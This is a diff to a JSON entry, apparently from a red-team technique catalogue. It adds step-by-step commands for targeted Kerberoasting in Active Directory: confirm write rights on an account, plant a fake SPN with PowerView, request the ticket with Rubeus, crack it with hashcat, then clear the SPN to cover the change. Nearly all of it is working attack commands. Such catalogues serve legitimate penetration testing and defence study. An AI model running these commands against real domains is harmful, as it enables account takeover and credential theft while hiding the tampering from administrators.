@@ -84,5 +84,29 @@
   },
   "tools": [
     "PowerView"
+  ],
+  "variations": [
+    {
+      "label": "Revert the SPN after roasting",
+      "command": "Set-DomainObject -Credential $Cred -Identity <target> -Clear serviceprincipalname"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Confirm GenericWrite/GenericAll on the target",
+      "command": "Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '<user>'}"
+    },
+    {
+      "label": "Set a fake SPN on the target",
+      "command": "Set-DomainObject -Credential $Cred -Identity <target> -SET @{serviceprincipalname='nonexistent/BLAH'}"
+    },
+    {
+      "label": "Kerberoast it",
+      "command": ".\\Rubeus.exe kerberoast /user:<target> /nowrap"
+    },
+    {
+      "label": "Crack + then remove the SPN",
+      "command": "hashcat -m 13100 hash.txt rockyou.txt ; Set-DomainObject -Identity <target> -Clear serviceprincipalname"
+    }
   ]
 }
